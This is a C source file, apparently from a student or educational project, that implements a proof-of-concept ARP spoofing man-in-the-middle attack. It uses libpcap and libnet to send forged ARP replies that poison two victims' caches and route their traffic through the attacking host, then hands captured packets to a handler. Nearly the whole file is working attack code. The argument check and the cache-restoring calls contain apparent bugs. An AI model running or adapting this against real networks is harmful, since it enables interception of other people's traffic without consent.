/**
 * @file    inquisitor.c
 * @author  Ernesto Martínez Gómez (@ernestomgz),
 *          Antonio J. Galán Herrera (@15Galan)
 * @brief   Proof of Concept of a 'Man In The Middle' attack ('ARP Spoofing').
 * @date    2022-08-17
 * @version 0.1
 */


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pcap.h>
#include <libnet.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#include "packetManage.h"
#include "utils.h"
#include "targets.h"

struct in_addr ip_attacker;
struct libnet_ether_addr *mac_attacker;

//IP and MAC from victim1
struct in_addr ip_victim1;
struct libnet_ether_addr *mac_victim1;

//IP and MAC from victim2
struct in_addr ip_victim2;
struct libnet_ether_addr *mac_victim2;

//broadcast
struct libnet_ether_addr *mac_bcast;

// Verbose
int verbose = 0;

// Signal handler

int main(int argc,char *argv[]){
	// Check arguments cuantity.
	if (argc == 6 && strcmp(argv[5], "-v") == 0) {
        printf("Verbose mode enabled.\n");
        verbose = 1;
    }else if (argc != 5 && strcmp(argv[5], "-v") != 0) {
        printf("Usage: %s <Source IP> <Source MAC> <Destination IP> <Destination MAC> [-v]\n", argv[0]);
        exit(0);
    }

	char error_buffer[PCAP_ERRBUF_SIZE];    // Buffer to capture errors for libpcap
	char errbuf[LIBNET_ERRBUF_SIZE];       // Buffer to capture errors for libnet
                                           
   
	int timeout_limit = 100;              // Timeout limit (in ms)
	int snapshot_length = 1024;             // How many bytes to capture
	int total_packet_count = 0;           // How many packets to capture


	/* automatically detects the device(eth0 or other) */
	pcap_if_t* alldevs;
	int devStatus = pcap_findalldevs(&alldevs, error_buffer);

	if (devStatus==-1) {
		printf("Error finding device: %s\n", error_buffer);
		return 1;
	}


	/* Open device for live capture */
	pcap_t *handle = pcap_open_live( alldevs->name ,snapshot_length,0,timeout_limit,error_buffer);

    /* Create a contex for libnet */
    libnet_t *l = libnet_init(LIBNET_LINK,alldevs->name,errbuf);

    void signal_handler(int signum) {

        //pcap_breakloop(handle);
        sendARP(mac_victim1,ip_victim1,ip_victim2,mac_victim2,l);
        sendARP(mac_victim2,ip_victim2,ip_victim1,mac_victim2,l);
        pcap_breakloop(handle);
    }

    signal(SIGINT, signal_handler);
    //sorry if you have to read it. Follow me on git im sr galan

	/* Initialize all targets */
	construct_targets(l,argc,argv);

	sendARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,l);
	sendARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,l);

	/* loop to capture packets */
	pcap_loop(handle, total_packet_count, my_packet_handler, (u_char *)l);

	printf("exited the loop");
	pcap_close(handle);

    libnet_destroy(l);

    free(mac_victim1);
    free(mac_victim2);

	return 0;
}
